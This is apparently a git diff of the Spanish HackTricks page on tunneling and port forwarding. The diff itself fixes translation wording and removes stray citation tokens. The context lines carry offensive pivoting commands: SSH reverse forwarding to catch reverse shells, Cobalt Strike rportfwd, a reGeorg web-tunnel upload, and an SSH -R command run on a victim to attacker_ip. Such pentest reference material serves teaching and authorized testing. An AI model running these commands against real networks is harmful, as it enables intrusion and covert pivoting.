@@ -1,4 +1,4 @@
-# Túneles y Reenvío de Puertos
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -55,9 +55,9 @@ Puerto local --> Host comprometido (SSH) --> Donde sea
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Reenvío de Puertos Inverso
+### Reverse Port Forwarding
 
-Esto es útil para obtener shells inversos de hosts internos a través de una DMZ a tu host:
+Esto es útil para obtener shells reversos de hosts internos a través de una DMZ a tu host:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Seguridad – Ataque Terrapin (CVE-2023-48795)**
-> El ataque de degradación Terrapin de 2023 puede permitir que un atacante de tipo man-in-the-middle manipule el primer apretón de manos SSH e inyecte datos en **cualquier canal redirigido** ( `-L`, `-R`, `-D` ). Asegúrese de que tanto el cliente como el servidor estén parcheados (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o desactive explícitamente los algoritmos vulnerables `chacha20-poly1305@openssh.com` y `*-etm@openssh.com` en `sshd_config`/`ssh_config` antes de confiar en túneles SSH. citeturn4search0
+> El ataque de degradación Terrapin de 2023 puede permitir que un atacante de tipo man-in-the-middle manipule el primer apretón de manos SSH e inyecte datos en **cualquier canal redirigido** ( `-L`, `-R`, `-D` ). Asegúrese de que tanto el cliente como el servidor estén parcheados (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o desactive explícitamente los algoritmos vulnerables `chacha20-poly1305@openssh.com` y `*-etm@openssh.com` en `sshd_config`/`ssh_config` antes de confiar en túneles SSH.
 
 ## SSHUTTLE
 
@@ -149,21 +149,21 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host del beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Para tener en cuenta:
 
-- La reversa de puerto de Beacon está diseñada para **túnel tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
+- La reversa de puerto de Beacon está diseñada para **túnel tráfico al Servidor de Equipo, no para retransmitir entre máquinas individuales**.
 - El tráfico está **tuneleado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
 - **No se requieren privilegios de administrador** para crear reenvíos de puerto reverso en puertos altos.
 
 ### rPort2Port local
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host de beacon**, no en el Servidor del Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor del Equipo) y desde allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host de beacon**, no en el Servidor de Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor de Equipo) y desde allí al host:puerto indicado.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -172,7 +172,7 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Necesitas subir un archivo web túnel: ashx|aspx|js|jsp|php|php|jsp
+Necesitas subir un archivo web de túnel: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
@@ -324,7 +324,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Es como una versión de consola de PuTTY (las opciones son muy similares a un cliente ssh).
+Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).
 
 Como este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para poder tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
@@ -358,7 +358,7 @@ En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ahora podemos **connect** a la **victim** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **prompt** que dice que el **SocksOverRDP plugin is enabled**, y estará **listen** en **127.0.0.1:1080**.
+Ahora podemos **connect** a la **victim** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **prompt** que dice que el **SocksOverRDP plugin is enabled**, y que **listen** en **127.0.0.1:1080**.
 
 **Connect** a través de **RDP** y sube y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
 ```
@@ -484,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **es una herramienta para exponer soluciones a Internet en una línea de comando.**\
-_Las URI de exposición son como:_ **UID.ngrok.io**
+_URI de exposición son como:_ **UID.ngrok.io**
 
 ### Instalación
 
@@ -574,7 +574,7 @@ Iniciar el conector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Porque todo el tráfico sale del host **saliente por 443**, los túneles de Cloudflared son una forma simple de eludir las ACL de ingreso o los límites de NAT. Ten en cuenta que el binario generalmente se ejecuta con privilegios elevados; usa contenedores o la bandera `--user` cuando sea posible. citeturn1search0
+Porque todo el tráfico sale del host **saliente por 443**, los túneles de Cloudflared son una forma simple de eludir las ACL de entrada o los límites de NAT. Ten en cuenta que el binario generalmente se ejecuta con privilegios elevados; usa contenedores o la bandera `--user` cuando sea posible.
 
 ## FRP (Fast Reverse Proxy)
 
@@ -608,7 +608,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-El comando anterior publica el puerto de la víctima **8080** como **attacker_ip:9000** sin desplegar ninguna herramienta adicional, lo que es ideal para pivotar aprovechando recursos existentes. citeturn2search1
+El comando anterior publica el puerto de la víctima **8080** como **attacker_ip:9000** sin desplegar ninguna herramienta adicional, lo que es ideal para pivotar aprovechando recursos existentes.
 
 ## Otras herramientas para verificar
 
